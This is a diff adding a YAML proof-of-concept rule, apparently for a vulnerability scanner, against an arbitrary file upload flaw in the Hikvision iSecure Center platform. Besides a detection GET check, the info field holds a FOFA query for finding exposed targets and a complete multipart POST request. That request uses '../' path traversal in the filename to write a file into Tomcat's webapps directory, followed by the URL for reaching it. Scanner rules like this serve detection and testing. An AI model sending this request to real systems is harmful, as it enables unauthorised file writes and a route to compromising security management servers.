@@ -1,0 +1,32 @@
+name: poc-yaml-hikvision-iSecure-Center-report-file-upload
+rules:
+  - method: GET
+    path: /center/api/files;.js
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"\"code\":\"0\"")
+detail:
+  author: test
+  info: |
+    海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
+    FOFA：app=“HIKVISION-iSecure-Center”
+    访问接口会返回{"code":"0","data":"url is error","msg":""} 表示可能存在漏洞
+
+    POST /center/api/files;.js HTTP/1.1
+    Host: xxxxxx
+    User-Agent: python-requests/2.25.1
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Length: 258
+    Content-Type: multipart/form-data; boundary=0a9444c2575525c8da293d4a192c6fe5
+
+    --0a9444c2575525c8da293d4a192c6fe5
+    Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/XFY07T7QZX.txt"
+    Content-Type: application/octet-stream
+
+    05RS52LR7
+    --0a9444c2575525c8da293d4a192c6fe5--
+
+    上传成功后访问https://x.x.x.x/clusterMgr/ccc.txt;.js
+  links:
+    - https://blog.csdn.net/weixin_43981050/article/details/132734363
